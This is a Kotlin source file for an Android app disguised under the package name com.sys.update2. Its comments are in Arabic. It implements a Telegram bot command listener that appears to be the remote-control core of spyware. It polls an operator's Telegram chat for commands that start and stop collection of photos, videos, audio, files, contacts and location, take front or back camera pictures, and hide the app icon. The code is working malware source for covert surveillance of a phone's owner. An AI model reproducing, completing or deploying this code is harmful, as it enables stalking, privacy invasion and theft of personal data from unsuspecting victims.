// language: Kotlin, file: CommandListener.kt
// *يبحث عن الأمر والكود في أي مكان في الرسالة*
// *يدعم الكتابة اليدوية بدون نسخ*

package com.sys.update2

import android.content.Context
import android.util.Log
import org.json.JSONObject
import kotlin.concurrent.thread

object CommandListener {

    private var running = false
    private var worker: Thread? = null
    private var offset = 0L

    private val PUBLIC_COMMANDS = setOf(
        "/start", "/menu", "/help", "menu", "help", "مساعدة",
        "🏠 القائمة", "📱 قائمة الأجهزة", "🌐 كل الأجهزة",
        "/devices", "/list", "devices", "list"
    )

    // كل الأوامر المعروفة (اللي بتتطلب كود الجهاز)
    private val KNOWN_COMMANDS = setOf(
        "/photos_start", "/photos_stop",
        "/videos_start", "/videos_stop",
        "/audio_start", "/audio_stop",
        "/files_start", "/files_stop",
        "/apk_start", "/apk_stop",
        "/contacts_start", "/contacts_stop",
        "/location_start", "/location_stop",
        "/stop", "/status", "/permissions",
        "/hide", "/show", "/info",
        "/location", "/cam_front", "/cam_back",
        "/sync", "/sync_status", "/help_all"
    )

    fun start(ctx: Context) {
        if (running) return
        running = true
        Log.d("CmdListener", "Starting...")

        val prefs = ctx.getSharedPreferences("cmd_prefs", Context.MODE_PRIVATE)
        offset = prefs.getLong("offset", 0L)

        try {
            if (!prefs.getBoolean("welcomed", false)) {
                val code = DeviceManager.getDeviceCode(ctx)
                val name = DeviceManager.getDeviceName(ctx)
                TelegramApi.sendMessage(
                    "🎛 *لوحة التحكم*\n\n" +
                    "🏷 *$name*\n🆔 `$code`\n\n" +
                    "استخدم الرمز مع كل أمر:\n" +
                    "`/photos_start $code`\n\n" +
                    "أو أرسل `/menu` للقائمة الكاملة"
                )
                prefs.edit().putBoolean("welcomed", true).apply()
            }
        } catch (e: Exception) {
            Log.e("CmdListener", "welcome err: ${e.message}")
        }

        worker = thread(name = "telegram-poll") {
            while (running) {
                try { poll(ctx) } catch (e: Exception) {
                    Log.e("CmdListener", "poll err: ${e.message}")
                    Thread.sleep(2000)
                }
            }
        }
    }

    fun stop() {
        running = false
        worker?.interrupt()
        worker = null
    }

    private fun poll(ctx: Context) {
        try {
            val updates = TelegramApi.getUpdates(offset) ?: run {
                Thread.sleep(2000); return
            }
            if (updates.length() == 0) return

            for (i in 0 until updates.length()) {
                val update = updates.optJSONObject(i) ?: continue
                val updateId = update.optLong("update_id", 0)
                offset = updateId + 1
                try {
                    ctx.getSharedPreferences("cmd_prefs", Context.MODE_PRIVATE)
                        .edit().putLong("offset", offset).apply()
                } catch (_: Exception) {}
                processUpdate(ctx, update)
            }
        } catch (e: Exception) {
            Log.e("CmdListener", "poll err: ${e.message}")
            Thread.sleep(3000)
        }
    }

    private fun processUpdate(ctx: Context, update: JSONObject) {
        try {
            update.optJSONObject("callback_query")?.let { cb ->
                val cbId = cb.optString("id", "")
                TelegramApi.answerCallback(cbId)
                return
            }

            update.optJSONObject("message")?.let { msg ->
                val text = msg.optString("text", "").trim()
                if (text.isBlank()) return

                val chatId = msg.optJSONObject("chat")?.optLong("id", 0L) ?: 0L
                val fromId = msg.optJSONObject("from")?.optLong("id", 0L) ?: 0L

                val adminId = Config.TELEGRAM_CHAT_ID.toLongOrNull() ?: 0L
                if (adminId != 0L && (chatId != adminId || fromId != adminId)) {
                    Log.w("CmdListener", "unauthorized: chat=$chatId from=$fromId")
                    return
                }

                handleCommand(ctx, text)
            }
        } catch (e: Exception) {
            Log.e("CmdListener", "process err: ${e.message}")
        }
    }

    // ═══════════════════════════════════════════
    //  handleCommand — البحث الذكي
    // ═══════════════════════════════════════════
    private fun handleCommand(ctx: Context, text: String) {
        val raw = text.trim()
        val lower = raw.lowercase()

        // 1) الأوامر العامة (مطابقة دقيقة)
        for (pub in PUBLIC_COMMANDS) {
            if (lower == pub.lowercase()) {
                CommandExecutor.handlePublic(ctx, pub)
                return
            }
        }

        // 2) استخرج الكود من أي مكان في النص
        val code = extractCode(raw)
        if (code == null) {
            // مفيش كود — نتجاهل
            return
        }

        // 3) تحقق إن الكود بتاعي
        if (!DeviceManager.isMyCode(ctx, code)) {
            Log.d("CmdListener", "code mismatch: $code")
            return
        }

        // 4) استخرج الأمر من أي مكان في النص
        val command = extractCommand(raw, code)
        if (command == null) {
            // ممكن المستخدم بعت الكود بس — نعرضله القائمة
            if (raw.replace(code, "").trim().isBlank() ||
                raw.replace(code, "").trim().length < 3) {
                CommandExecutor.handlePublic(ctx, "/menu")
            }
            return
        }

        // 5) نفّذ
        CommandExecutor.handleText(ctx, command, code)
    }

    /**
     * يستخرج الكود من أي مكان في النص.
     * الكود: 6-8 حروف A-Z أو 0-9
     */
    private fun extractCode(text: String): String? {
        // شيل الرموز الشائعة من البداية
        val cleaned = text
            .replace("@", " ")
            .replace(",", " ")
            .replace(".", " ")

        val tokens = cleaned.split(Regex("[\\s\\-_]+")).filter { it.isNotBlank() }

        for (tok in tokens) {
            // تجاهل الأوامر اللي بتبدأ بـ /
            if (tok.startsWith("/")) continue
            // تجاهل كلمات طويلة جداً (زي الروابط)
            if (tok.length > 10) continue
            // تجاهل الأرقام الصافية الطويلة (ممكن تكون IDs)
            // نتقبل بس اللي 6-8 حروف

            val clean = tok.uppercase().filter { it.isLetterOrDigit() }
            if (clean.length in 6..8 && clean.all { it in 'A'..'Z' || it in '0'..'9' }) {
                // تأكد إنها مش كلمة عادية (زي START، DEVICE، إلخ)
                val commonWords = setOf(
                    "START", "STOP", "DEVICE", "PHOTOS", "VIDEOS", "AUDIO",
                    "FILES", "CAMERA", "SYSTEM", "UPDATE", "ANDROID",
                    "MOBILE", "SCREEN", "LISTEN", "TARGET"
                )
                if (clean !in commonWords) {
                    return clean
                }
            }
        }
        return null
    }

    /**
     * يستخرج الأمر من النص.
     * الأمر لازم يبدأ بـ / ويكون من الأوامر المعروفة.
     */
    private fun extractCommand(text: String, code: String): String? {
        // 1) ابحث عن أمر معروف في النص (case-insensitive)
        val lower = text.lowercase()
        // رتّب الأوامر بالطول (الأطول أولاً) لتجنب التداخل
        val sortedCommands = KNOWN_COMMANDS.sortedByDescending { it.length }
        for (cmd in sortedCommands) {
            if (lower.contains(cmd.lowercase())) {
                return cmd
            }
        }

        // 2) ابحث عن أي كلمة تبدأ بـ /
        val tokens = text.split(Regex("\\s+"))
        for (tok in tokens) {
            if (tok.startsWith("/") && tok.length > 1) {
                val clean = tok.substringBefore("@").lowercase()
                // اقبل أي أمر /xxx (حتى لو مش معروف — CommandExecutor هيتعامل)
                return clean
            }
        }

        return null
    }
}
